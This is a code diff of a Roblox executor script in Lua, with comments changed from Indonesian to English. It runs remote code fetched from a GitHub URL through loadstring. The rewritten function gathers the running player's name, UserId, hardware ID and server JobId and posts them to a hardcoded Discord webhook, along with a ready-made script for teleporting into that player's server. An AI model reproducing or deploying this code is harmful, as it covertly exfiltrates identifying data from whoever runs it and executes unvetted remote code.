@@ -14,114 +14,113 @@ if placeId == 15135285305 then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefkey'))()
 end
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-local TeleportService = game:GetService("TeleportService")
+-- Function to send teleport information and prepare teleport script
+local function sendTeleportInfoAndPrepareScript()
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+    local TeleportService = game:GetService("TeleportService")
 
--- Gantikan ini dengan URL webhook Anda
-local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"
+    -- Replace this with your webhook URL
+    local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"
 
--- Fungsi untuk mengirim nama, UserId, HWID, dan link join server pemain ke Discord
-local function sendPlayerInfo()
-    local localPlayer = Players.LocalPlayer
-    if not localPlayer then
-        warn("LocalPlayer tidak ditemukan")
-        return
+    -- Function to send information to Discord and prepare teleport script
+    local function sendTeleportInfo()
+        local localPlayer = Players.LocalPlayer
+        if not localPlayer then
+            warn("LocalPlayer not found")
+            return
+        end
+
+        local playerName = localPlayer.Name
+        local userId = localPlayer.UserId
+        local HWID = RbxAnalyticsService:GetClientId()
+        local placeId = game.PlaceId
+        local jobId = game.JobId
+
+        -- Create payload to send to Discord
+        local data = {
+            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
+        }
+
+        -- Convert data to JSON format
+        local jsonData = HttpService:JSONEncode(data)
+
+        -- Send POST request to Discord webhook
+        local response
+        if syn then
+            response = syn.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        elseif http and http.request then
+            response = http.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        elseif request then
+            response = request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        elseif http_request then
+            response = http_request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        elseif solara then
+            response = solara.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        else
+            warn("No supported executor found to perform HTTP request.")
+            return
+        end
+
+        if response.StatusCode == 204 then
+            print("Teleport information successfully sent to Discord")
+        else
+            warn("Error sending information: " .. response.StatusMessage)
+        end
     end
 
-    local playerName = localPlayer.Name
-    local userId = localPlayer.UserId
-    local HWID = RbxAnalyticsService:GetClientId()
-
-    -- Membuat link join server
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    local joinLink = "https://www.roblox.com/games/" .. placeId .. "/--?gameInstanceId=" .. jobId
-
-    -- Membuat payload untuk dikirim ke Discord
-    local data = {
-        ["content"] = "------------\nNama LocalPlayer: " .. playerName .. "\nUserId LocalPlayer: " .. userId .. "\nHWID LocalPlayer: " .. HWID .. "\nJoin Server: " .. joinLink .. "\n------------"
-    }
-
-
-    -- Mengubah data ke format JSON
-    local jsonData = HttpService:JSONEncode(data)
-
-    -- Mengirim request POST ke webhook Discord menggunakan berbagai executor HTTP request functions
-    local response
-    if syn then
-        response = syn.request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-    elseif http and http.request then
-        response = http.request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-    elseif request then
-        response = request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-    elseif http_request then
-        response = http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-   elseif solara then
-        response = solara.request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = jsonData
-        })
-    else
-        warn("Tidak ada executor yang didukung ditemukan untuk melakukan permintaan HTTP.")
-        return
-    end
-
-    if response.StatusCode == 204 then
-        print("done")
-    else
-        warn("something error: " .. response.StatusMessage)
-    end
-end
-
--- Tunggu pemain lokal tersedia sebelum mengirim nama, UserId, dan HWID
-Players.PlayerAdded:Connect(function(player)
-    if player == Players.LocalPlayer then
-        sendPlayerInfo()
-    end
-end)
-
--- Jika pemain lokal sudah ada (misalnya, jika skrip dijalankan setelah pemain ditambahkan)
-if Players.LocalPlayer then
-    sendPlayerInfo()
-else
+    -- Wait for local player to be available before sending information and teleporting
     Players.PlayerAdded:Connect(function(player)
         if player == Players.LocalPlayer then
-            sendPlayerInfo()
+            sendTeleportInfo()
+            -- Uncomment below line if you want to teleport after sending info
+            -- teleportToServer(game.PlaceId, game.JobId)
         end
     end)
+
+    -- If local player is already present (e.g., if script is run after player is added)
+    if Players.LocalPlayer then
+        sendTeleportInfo()
+        -- Uncomment below line if you want to teleport after sending info
+        -- teleportToServer(game.PlaceId, game.JobId)
+    end
 end
 
+-- Invoke the function to send teleport information and prepare teleport script
+sendTeleportInfoAndPrepareScript()
